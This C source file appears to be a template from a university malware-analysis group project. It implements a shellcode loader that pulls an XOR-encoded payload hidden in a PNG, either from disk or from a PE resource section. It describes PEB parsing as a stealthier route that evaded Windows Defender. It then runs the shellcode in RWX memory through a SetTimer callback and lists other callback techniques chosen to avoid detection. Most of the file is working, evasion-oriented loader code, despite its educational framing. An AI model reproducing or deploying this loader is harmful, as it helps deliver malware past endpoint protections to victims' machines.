/*
 * REFERENCE ONLY - C/C++ Payload Extractor Template
 * ===================================================
 * This file shows the C code structure used in real-world attacks
 * (hide-payload-in-images + Adaptix C2 style) for educational reference.
 *
 * DO NOT COMPILE OR USE - this is for slide content and code review only.
 *
 * Three extraction methods demonstrated:
 *   Method 1: From disk file (simplest)
 *   Method 2: From PE .rsrc section via WinAPI (common)
 *   Method 3: From PE .rsrc section via PEB parsing (stealthiest)
 *
 * CMU Heinz College - 95-759 Malicious Code Analysis
 * Group Project: Steganography-Based C2 Channel
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

// ============================================================
// CONSTANTS - Set these from payload_embedder.py output
// ============================================================
#define ORIGINAL_FILE_SIZE  75989    // Size of clean PNG before embedding
#define XOR_KEY             0x4D     // XOR encryption key (0 = no encryption)
#define TARGET_FILE_PATH    "C:\\Users\\Public\\photo.png"  // Path to embedded image

// ============================================================
// METHOD 1: Extract payload from image file on disk
// ============================================================
// This is the simplest method. The image file sits on disk and
// the loader reads past the original image data to get the payload.
//
// Pros: Simple, works with any image source
// Cons: Payload file touches disk (can be scanned by AV)
// ============================================================

unsigned char* extract_from_file(const char* filepath, size_t* payload_size) {
    FILE* f = fopen(filepath, "rb");
    if (!f) return NULL;

    // Get total file size
    fseek(f, 0, SEEK_END);
    size_t total_size = ftell(f);

    // Payload starts after the original image data + 4-byte size header
    size_t payload_offset = ORIGINAL_FILE_SIZE + 4;  // +4 for size header

    // Read size header
    fseek(f, ORIGINAL_FILE_SIZE, SEEK_SET);
    unsigned int size_from_header;
    fread(&size_from_header, sizeof(unsigned int), 1, f);

    *payload_size = size_from_header;

    // Read payload
    unsigned char* payload = (unsigned char*)malloc(*payload_size);
    fseek(f, payload_offset, SEEK_SET);
    fread(payload, 1, *payload_size, f);
    fclose(f);

    // XOR decrypt if needed
    if (XOR_KEY != 0) {
        for (size_t i = 0; i < *payload_size; i++) {
            payload[i] ^= XOR_KEY;
        }
    }

    return payload;
}

// ============================================================
// METHOD 2: Extract from PE resources section (.rsrc) via WinAPI
// ============================================================
// The image is compiled INTO the executable as a resource.
// No external file needed - everything is self-contained.
//
// Pros: No file on disk, self-contained binary
// Cons: WinAPI calls (FindResource, LoadResource) can be hooked by EDR
// ============================================================

unsigned char* extract_from_rsrc_winapi(size_t* payload_size) {
    // Find the resource in this executable's .rsrc section
    // Resource ID and type come from Visual Studio resource editor
    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(101), RT_RCDATA);
    if (!hRes) return NULL;

    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return NULL;

    unsigned char* resource_data = (unsigned char*)LockResource(hData);
    DWORD resource_size = SizeofResource(NULL, hRes);

    // Same extraction logic: skip past original image data
    if (resource_size <= ORIGINAL_FILE_SIZE + 4) return NULL;

    // Read size header
    unsigned int size_from_header;
    memcpy(&size_from_header, resource_data + ORIGINAL_FILE_SIZE, 4);
    *payload_size = size_from_header;

    // Copy and decrypt payload
    unsigned char* payload = (unsigned char*)malloc(*payload_size);
    memcpy(payload, resource_data + ORIGINAL_FILE_SIZE + 4, *payload_size);

    if (XOR_KEY != 0) {
        for (size_t i = 0; i < *payload_size; i++) {
            payload[i] ^= XOR_KEY;
        }
    }

    return payload;
}

// ============================================================
// METHOD 3: Extract from .rsrc via PEB parsing (NO WinAPI)
// ============================================================
// Manually walks the Process Environment Block to find the PE
// headers, then parses the resource directory to locate the image.
//
// Pros: No WinAPI calls = harder for EDR to hook/detect
// Cons: Complex, architecture-dependent, fragile
//
// This is the technique that bypassed Windows Defender + MDE
// in the hide-payload-in-images research.
// ============================================================

/*
 * PEB-based resource extraction (pseudocode):
 *
 * 1. Get PEB address via __readgsqword(0x60)  [x64]
 *                    or __readfsdword(0x30)    [x86]
 *
 * 2. PEB->Ldr->InMemoryOrderModuleList gives loaded modules
 *    First entry = current process executable
 *
 * 3. Get DllBase from the module entry = PE base address
 *
 * 4. Parse PE headers:
 *    base + DOS_HEADER->e_lfanew = NT_HEADERS
 *    NT_HEADERS->OptionalHeader.DataDirectory[2] = RESOURCE_DIR
 *
 * 5. Walk the resource directory tree:
 *    Level 1: Resource Type (RT_RCDATA = 10)
 *    Level 2: Resource ID (101 or whatever was set)
 *    Level 3: Language ID (usually 0 = neutral)
 *
 * 6. Resource data entry gives offset + size
 *    The image bytes (with appended payload) are at that offset
 *
 * 7. Extract payload same as Methods 1 & 2
 */

// ============================================================
// EXECUTION: Run extracted shellcode in memory
// ============================================================
// Multiple callback-based execution methods to avoid detection:
//   - VirtualAlloc + memcpy + SetTimer callback
//   - VirtualAlloc + memcpy + EnumFonts callback
//   - VirtualAlloc + memcpy + CreateThread
//   - Fiber-based execution
//   - APC injection
// See: github.com/aahmad097/AlternativeShellcodeExec
// ============================================================

void execute_payload(unsigned char* payload, size_t payload_size) {
    // Allocate RWX memory
    void* exec_mem = VirtualAlloc(NULL, payload_size,
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_EXECUTE_READWRITE);
    if (!exec_mem) return;

    // Copy shellcode to executable memory
    memcpy(exec_mem, payload, payload_size);

    // Execute via callback (SetTimer method shown here)
    // The callback signature matches TIMERPROC
    MSG msg;
    SetTimer(NULL, 0, 0, (TIMERPROC)exec_mem);
    GetMessage(&msg, NULL, 0, 0);
    DispatchMessage(&msg);

    // Cleanup
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    free(payload);
}

// ============================================================
// MAIN - Select extraction method and execute
// ============================================================
int main() {
    size_t payload_size = 0;
    unsigned char* payload = NULL;

    // Choose extraction method:
    // payload = extract_from_file(TARGET_FILE_PATH, &payload_size);
    // payload = extract_from_rsrc_winapi(&payload_size);
    // payload = extract_from_rsrc_peb(&payload_size);  // stealthiest

    if (payload && payload_size > 0) {
        execute_payload(payload, payload_size);
    }

    return 0;
}
